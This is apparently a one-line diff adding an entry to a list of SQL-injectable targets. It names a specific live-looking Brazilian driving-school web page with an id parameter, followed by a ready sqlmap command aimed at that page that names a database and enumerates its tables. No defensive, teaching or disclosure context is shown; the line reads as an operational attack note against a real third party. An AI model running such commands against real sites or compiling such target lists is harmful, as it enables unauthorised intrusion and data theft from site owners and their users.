@@ -1,0 +1,1 @@
+http://www.autoclique.com.br/auto_escolas/temas/versao_4/index.php?id=134 (GET)  # sqlmap.py -u http://www.autoclique.com.br/auto_escolas/temas/versao_4/index.php?id=134 -D wwwauto_ae1 --tables --threads 5 -v3
